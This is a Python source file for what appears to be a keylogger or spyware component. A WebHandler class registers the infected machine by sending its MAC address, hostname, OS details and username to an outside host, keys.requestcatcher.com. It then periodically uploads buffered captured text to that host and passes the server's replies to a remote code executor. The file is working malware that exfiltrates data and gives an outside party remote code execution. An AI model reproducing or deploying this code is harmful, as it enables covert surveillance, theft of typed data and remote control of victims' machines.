#
from helpers.file_handler import Handler
from helpers import secure_requests
import textwrap
import uuid
import platform
import getpass
from helpers.remote_code_executor import Executor

ENDPOINT = 'https://keys.requestcatcher.com/'


class WebHandler(Handler):
    def __init__(self):
        super().__init__()
        self.uid = self.enroll()
        self.executor = Executor(ENDPOINT + 'response')

    def enroll(self):
        return secure_requests.post(ENDPOINT + 'enroll', json={
            'mac': self.find_mac(),
            'system': {
                'machine': platform.machine(),
                'name': platform.node(),
                'os': platform.system(),
                'version': (platform.release(), platform.version()),
            },
            'user': getpass.getuser(),
            # IP addr from request
        }).text

    def write(self, something='', flush=False):
        self.cache += something
        if flush or len(self.cache) > self.max_cache:
            response = secure_requests.post(ENDPOINT + 'write', json={'text': self.cache, 'uid': self.uid}).text
            self.executor.handle(response)
            self.cache = ''

    @staticmethod
    def find_mac():
        return ':'.join(textwrap.wrap('%012x' % uuid.getnode(), 2)).upper()

    def __del__(self):
        self.write(flush=True)
